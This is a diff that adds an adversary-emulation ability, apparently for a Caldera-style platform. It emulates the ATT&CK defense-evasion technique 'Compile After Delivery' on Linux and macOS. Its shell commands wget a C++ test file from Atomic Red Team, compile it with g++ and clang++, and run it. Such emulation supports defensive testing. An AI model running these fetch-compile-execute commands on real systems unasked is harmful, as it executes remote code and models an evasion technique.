@@ -1,0 +1,51 @@
+- access: {}
+  repeatable: false
+  delete_payload: true
+  description: 'Compile a c file with either gcc or clang on Linux or Macos.
+
+    '
+  name: CC compile
+  privilege: ''
+  buckets:
+  - defense-evasion
+  tactic: defense-evasion
+  additional_info: {}
+  technique_name: 'Obfuscated Files or Information: Compile After Delivery'
+  executors:
+  - build_target: null
+    parsers: []
+    name: sh
+    timeout: 60
+    cleanup: []
+    command: 'if [ -e  d7822f_T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc
+      -O d7822f_T1027-004-test.cc; fi;  ;  g++ d7822f_T1027-004-test.cc && ./a.out;
+      clang++ d7822f_T1027-004-test.cc && ./a.out'
+    language: null
+    additional_info: {}
+    payloads:
+    - d7822f_T1027-004-test.cc
+    variations: []
+    platform: darwin
+    uploads: []
+    code: null
+  - build_target: null
+    parsers: []
+    name: sh
+    timeout: 60
+    cleanup: []
+    command: 'if [ -e d7822f_T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc
+      -O d7822f_T1027-004-test.cc; fi && g++ d7822f_T1027-004-test.cc && ./a.out &&
+      clang++ d7822f_T1027-004-test.cc && ./a.out'
+    language: null
+    additional_info: {}
+    payloads:
+    - d7822f_T1027-004-test.cc
+    variations: []
+    platform: linux
+    uploads: []
+    code: null
+  technique_id: T1027.004
+  singleton: false
+  requirements: []
+  plugin: atomic
+  id: 37ec8aa96775f561e02a954dae1b56bc
